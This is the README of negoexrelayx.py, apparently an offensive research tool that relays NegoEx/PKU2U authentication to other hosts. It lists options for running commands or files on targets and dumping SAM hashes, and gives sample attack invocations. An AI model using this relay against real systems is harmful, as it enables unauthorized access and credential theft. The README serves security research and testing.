# Negoexrelayx - Negoex relaying tool

Toolkit for abusing Kerberos PKU2U and NegoEx.
Requires [impacket](https://github.com/SecureAuthCorp/impacket)
It is recommended to install impacket from git directly to have the latest version available.

## negoexrelayx.py
This tool allows you to relay NegoEx (with PKU2U) authentication to other copmuter and authenticate without knowing the credentials, similar to Ntlmrelayx.
```
NegoEx relay tool. By @rubin_mor

Main options:
  -h, --help            show this help message and exit
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON
  -t TARGET, --target TARGET
                        Target to relay the credentials to, can be an IP,
                        hostname or URL like domain\username@host:port
                        (domain\username and port are optional, and don't
                        forget to escape the '\'). If unspecified, it will
                        relay back to the client')
  -tf TARGETSFILE       File that contains targets by hostname or full URL,
                        one per line
  -w                    Watch the target file for changes and update target
                        list automatically (only valid with -tf)
  -i, --interactive     Launch an smbclient or LDAP console insteadof
                        executing a command after a successful relay. This
                        console will listen locally on a tcp port and can be
                        reached with for example netcat.
  -ip INTERFACE_IP, --interface-ip INTERFACE_IP
                        IP address of interface to bind SMB and HTTP servers
  --smb-port SMB_PORT   Port to listen on smb server
  --no-multirelay       If set, disable multi-host relay (SMB and HTTP
                        servers)
  -ra, --random         Randomize target selection
  -r SMBSERVER          Redirect HTTP requests to a file:// path on SMBSERVER
  -l LOOTDIR, --lootdir LOOTDIR
                        Loot directory in which gathered loot such as SAM
                        dumps will be stored (default: current directory).
  -of OUTPUT_FILE, --output-file OUTPUT_FILE
                        base output filename for encrypted hashes. Suffixes
                        will be added for ntlm and ntlmv2
  -codec CODEC          Sets encoding used (codec) from the target's output
                        (default "utf-8"). If errors are detected, run
                        chcp.com at the target, map the result with https://do
                        cs.python.org/3/library/codecs.html#standard-encodings
                        and then execute ntlmrelayx.py again with -codec and
                        the corresponding codec
  -smb2support          SMB2 Support
  -6, --ipv6            Listen on both IPv6 and IPv4
  --serve-image SERVE_IMAGE
                        local path of the image that will we returned to
                        clients
  -c COMMAND            Command to execute on target system (for SMB and RPC).
                        If not specified for SMB, hashes will be dumped
                        (secretsdump.py must be in the same directory). For
                        RPC no output will be provided.
  -clientname CLIENTNAME
                        A new name for the client name

SMB client options:
  -e FILE               File to execute on the target system. If not
                        specified, hashes will be dumped (secretsdump.py must
                        be in the same directory)
  --enum-local-admins   If relayed user is not admin, attempt SAMR lookup to
                        see who is (only works pre Win 10 Anniversary)
```
# Usage
To attack specific traget you can start the server with the command (note that SMB2 is usually must)
```
negoexrelayx.py -t IP -smb2support
```

To attack specific traget and change the client name in PKU2U
```
negoexrelayx.py -t IP -clientname NEW_NAME -smb2support
```